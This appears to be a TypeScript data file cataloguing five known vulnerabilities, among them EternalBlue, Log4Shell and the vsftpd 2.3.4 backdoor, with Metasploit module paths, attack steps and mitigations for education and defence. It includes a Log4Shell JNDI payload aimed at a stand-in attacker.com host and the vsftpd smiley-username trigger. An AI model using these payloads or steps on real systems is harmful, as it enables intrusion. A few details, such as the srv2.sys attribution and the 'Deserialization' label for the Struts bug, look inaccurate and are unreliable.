export interface Vulnerability {
  id: string;
  name: string;
  cve: string;
  description: string;
  risk: 'Critical' | 'High' | 'Medium';
  category: 'SMB' | 'Web Application' | 'FTP' | 'SSH' | 'Outdated Software';
  port: number;
  protocol: string;
  metasploitPath: string;
  attackPath: string[];
  impact: string;
  mitigation: string[];
}

export const vulnerabilities: Vulnerability[] = [
  {
    id: 'eternalblue',
    name: 'EternalBlue (MS17-010)',
    cve: 'CVE-2017-0144',
    description: 'A critical vulnerability in Microsoft\'s implementation of the Server Message Block (SMBv1) protocol. It allows remote attackers to execute arbitrary code on the target system by sending specially crafted packets.',
    risk: 'Critical',
    category: 'SMB',
    port: 445,
    protocol: 'TCP',
    metasploitPath: 'exploit/windows/smb/ms17_010_eternalblue',
    attackPath: [
      'Attacker performs a port scan and identifies SMBv1 (port 445) enabled on the target Windows system.',
      'Attacker sends custom-crafted SMB packets designed to trigger a buffer overflow in the srv2.sys driver.',
      'The target system executes the shellcode embedded in the packets with SYSTEM privileges.',
      'A reverse Meterpreter payload connects back to the attacker\'s listener, establishing full control.'
    ],
    impact: 'Complete system compromise. Immediate remote code execution (RCE) with administrative (SYSTEM) privileges, allowing lateral movement, credential theft, and ransomware deployment.',
    mitigation: [
      'Disable the legacy SMBv1 protocol in Windows features.',
      'Apply security update MS17-010 (KB4013389) immediately.',
      'Restrict access to TCP port 445 from the public internet using firewalls.',
      'Implement network segmentation to prevent internal lateral movement.'
    ]
  },
  {
    id: 'log4shell',
    name: 'Log4Shell',
    cve: 'CVE-2021-44228',
    description: 'A remote code execution vulnerability in the popular Apache Log4j Java logging library. It stems from improper validation of JNDI (Java Naming and Directory Interface) lookup requests, which allows attackers to load and execute remote Java classes.',
    risk: 'Critical',
    category: 'Web Application',
    port: 8080,
    protocol: 'HTTP',
    metasploitPath: 'exploit/multi/http/log4j_jndi_rce',
    attackPath: [
      'Attacker sends a malicious payload string (e.g., ${jndi:ldap://attacker.com/a}) in an HTTP request header (like User-Agent) that gets logged by Log4j.',
      'The Log4j library parses the string and initiates a lookup connection via JNDI to the attacker\'s LDAP server.',
      'The attacker\'s LDAP server redirects the target\'s JNDI lookup to a malicious Java class file.',
      'The target system downloads and runs the malicious Java class, initiating a reverse shell to the attacker.'
    ],
    impact: 'Full remote code execution on the server host. Can lead to server compromise, access to back-end databases, cloud credentials exposure, and internal network pivot.',
    mitigation: [
      'Upgrade Log4j to version 2.17.1 or higher.',
      'For older versions, remove the JndiLookup class from the classpath (zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class).',
      'Set the system property log4j2.formatMsgNoLookups=true on Java virtual machines (for versions >= 2.10).',
      'Block outbound JNDI-related protocols (LDAP, RMI) from servers using firewalls.'
    ]
  },
  {
    id: 'vsftpd_backdoor',
    name: 'vsftpd v2.3.4 Backdoor',
    cve: 'CVE-2011-2523',
    description: 'An old but famous vulnerability where the downloadable archive of vsftpd v2.3.4 was compromised with a backdoor. The backdoor opens a listening shell on port 6200 when a user logs in with a username ending in a smiley face (:) ).',
    risk: 'High',
    category: 'FTP',
    port: 21,
    protocol: 'TCP',
    metasploitPath: 'exploit/unix/ftp/vsftpd_234_backdoor',
    attackPath: [
      'Attacker connects to FTP service on port 21.',
      'Attacker attempts login with a username containing a smiley face (e.g., root:) ) and any password.',
      'The backdoored FTP daemon intercepts the smiley face username and spawns a root shell listening on TCP port 6200.',
      'Attacker connects to port 6200 and gains instant root shell access.'
    ],
    impact: 'Instant administrative (root) shell access without valid credentials. Allows attackers to steal files, view logs, and configure persistent control.',
    mitigation: [
      'Verify the MD5/SHA256 signature of installed software packages against official releases.',
      'Upgrade vsftpd to version 2.3.5 or newer, or replace with a clean package from trusted repositories.',
      'Ensure firewalls block unexpected listener ports such as port 6200.'
    ]
  },
  {
    id: 'ssh_bruteforce',
    name: 'SSH Weak Credentials / Brute Force',
    cve: 'CWE-521',
    description: 'Although not a software bug, weak SSH passwords and poor key configurations present a major vulnerability. Attackers use automated tools to try hundreds of thousands of common password combinations against the SSH service (port 22) until a correct credential is found.',
    risk: 'High',
    category: 'SSH',
    port: 22,
    protocol: 'TCP',
    metasploitPath: 'auxiliary/scanner/ssh/ssh_login',
    attackPath: [
      'Attacker scans network and finds port 22 (SSH) open.',
      'Attacker configures a Metasploit scanner with wordlists containing popular administrative usernames and passwords.',
      'Metasploit performs rapid authentication requests against the server.',
      'Once a match is found (e.g., admin:admin123), Metasploit logs in and opens an interactive shell session.'
    ],
    impact: 'Unauthorized access to the system terminal under the context of the cracked user. If the user has sudo rights, this leads to absolute administrative system control.',
    mitigation: [
      'Enforce strong password policies with high complexity and length requirements.',
      'Disable password-based authentication in sshd_config and mandate SSH Key-based login (PasswordAuthentication no).',
      'Disable root login via SSH (PermitRootLogin no).',
      'Deploy brute force prevention tools like Fail2ban or CrowdSec to temporarily ban IP addresses that repeatedly fail logins.'
    ]
  },
  {
    id: 'apache_struts',
    name: 'Apache Struts Deserialization RCE',
    cve: 'CVE-2017-5638',
    description: 'A remote code execution vulnerability in the Jakarta Multipart parser in Apache Struts 2. It occurs due to improper error handling during file uploads, allowing an attacker to inject Object-Graph Navigation Language (OGNL) expressions into the Content-Type header.',
    risk: 'High',
    category: 'Outdated Software',
    port: 8080,
    protocol: 'HTTP',
    metasploitPath: 'exploit/multi/http/struts2_content_type_ognl',
    attackPath: [
      'Attacker identifies a web server running an outdated version of Apache Struts.',
      'Attacker craft an HTTP request containing malicious OGNL expressions inside the Content-Type HTTP header.',
      'The Jakarta Multipart parser processes the invalid header, encounters an error, and evaluates the attacker\'s OGNL expression during error handling.',
      'The OGNL expression executes system commands on the server under the web server user process (e.g., www-data).'
    ],
    impact: 'Remote code execution under the permissions of the web server daemon. Attackers can read sensitive source code, steal web environment variables, and perform local privilege escalation.',
    mitigation: [
      'Upgrade to Apache Struts 2.3.32 or 2.5.10.1 or higher.',
      'Ensure web application firewalls (WAF) inspect the Content-Type header and block request patterns matching OGNL keywords (#, multipart/form-data, java.lang.ProcessBuilder).',
      'Run application containers and web servers as low-privileged users with disabled shells.'
    ]
  }
];
